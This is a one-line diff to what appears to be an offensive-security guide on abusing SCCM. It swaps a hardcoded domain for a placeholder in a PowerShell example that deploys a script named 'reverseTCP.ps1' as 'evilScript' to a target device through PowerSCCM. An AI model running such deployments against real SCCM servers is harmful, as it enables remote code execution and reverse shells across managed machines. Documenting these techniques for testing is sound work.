@@ -104,7 +104,7 @@ This [pull request](https://github.com/PowerShellMafia/PowerSCCM/pull/6) on Powe
 
 ```powershell
 # Create a CM drive if it doesn't already exist and deploy a CMScript on a target
-New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevice 'target' -Path '.\reverseTCP.ps1' -ScriptName 'evilScript'
+New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.$DOMAIN' -TargetDevice 'target' -Path '.\reverseTCP.ps1' -ScriptName 'evilScript'
 ```
 
 :::
